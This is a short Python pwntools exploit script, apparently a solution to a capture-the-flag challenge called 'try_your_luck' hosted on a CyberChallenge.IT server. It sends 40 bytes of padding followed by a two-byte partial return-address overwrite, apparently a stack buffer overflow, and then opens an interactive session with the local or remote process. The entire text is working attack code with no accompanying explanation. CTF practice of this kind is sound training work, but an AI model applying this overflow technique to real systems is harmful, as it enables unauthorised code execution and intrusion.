#!/usr/bin/env python3
from pwn import *

bin_name = "./try_your_luck"
elf = context.binary = ELF(bin_name)
context.terminal = ('gnome-terminal', '-e')

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b main\ncontinue\n')
    elif args.REMOTE:
        return remote("luck.challs.cyberchallenge.it", 9133)
    else:
        return process(elf.path)

def main():
    part = 0x83a
    r = conn()
    r.recv()
    payload = b'a'*40 + p16(part)
    r.send(payload)
    r.recvuntil(b"Nope! Sorry\n")
    r.interactive()

if __name__ == "__main__":
    main()
